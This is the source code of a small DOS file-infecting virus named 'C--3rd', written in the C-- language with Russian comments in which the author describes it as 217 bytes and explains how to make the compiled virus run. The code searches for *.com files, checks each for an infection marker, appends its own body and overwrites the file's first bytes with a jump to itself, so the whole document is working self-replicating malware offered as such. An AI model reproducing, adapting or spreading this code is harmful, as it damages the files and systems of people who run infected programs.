/* Все классно,но я так не смог определить динамически свой размер.
   Вот тебе и HLL.
   Немного соптимизировал путем замены процедур макросами... Как вам для HLL
   217 байт ?
Name:	C--3rd
Size:	217
Type:	Trivial.Com

Для запуска нужно добавить 4 NOP'a в начало скомпилированного виря

*/

/* Описания флагов компилятора */
?alignword		0		/* нет выравнивания */
?argc			0		/* не разбираем коммандную строку */
?ctrl_c			0		/* нет процедуры обработки ctrl-c */
?parsecommandline	0		/* аналогично argc */
?resize			0		/* Нет процедуры изменения блока 
						памяти */ 
?codesize				/* Оптимизация по размеру */
?jumptomain		short		
?startaddress		0		/* org 0 */
/* Некоторые include */
?include "dos.h--"

?define	vlen		217

byte	old[4] = {0x90,0xCD,0x20,0x90};	/* Первоначальный носитель */
					/* Тоже прикол,в результате получится
					   0x91,0xCD,0x20,0x90
					   Видимо где-то глючит от того что
					   прыжка нету */
byte	jmpc   = 0xE9;
word	jofs   = 0;
byte	mark   = 0x40;

/*---------------------------------------------------------------*/
main()
byte	dta[43];
word	temp;
{
 $call lbl
lbl:
 $pop  SI
 $sub  SI,#lbl
 temp = SI;
 
 DI = 0x100;
 $push DI
 SI = SI + #old;
 $movsw;		/* Восстановим носитель */
 $movsw;		/* Естественно можно использовать for но зачем ? */
 SI = temp;

 setDTA(SS,#dta);		/* Установим Dta */
 if (@FINDFIRSTFILE(,,0,#fmask+SI) == 0)
  {
   do
    {
      BX = FOPEN(2,,,#dta+0x1e);	/* Откроем найденый файл */
      @FREAD(,BX,4,#old+SI);		/* Прочитаем 4 байта */
       if (old[3+SI] != 0x40)		/* Есть метка заражения ? */
         {
          @FSEEK(2,BX,0,0);		/* Прыгаем на конец файла */
          $push AX;			/* Сохраним размер */
          @FWRITE(,BX,vlen,SI);		/* Пишим нас */
          $pop  AX;
	  jofs[SI] = AX - 3;
          @FSEEK(0,BX,0,0);		/* На начало файла */
          @FWRITE(,BX,4,#jmpc+SI);	/* Пишим Jmp */
         }
       @FCLOSE(,BX);			/* Закрываем файл */
    } while(@FINDNEXTFILE() == 0); 
  }
}					/* компилятор вставит ret */
byte	fmask = "*.com";		/* Собственно маска */
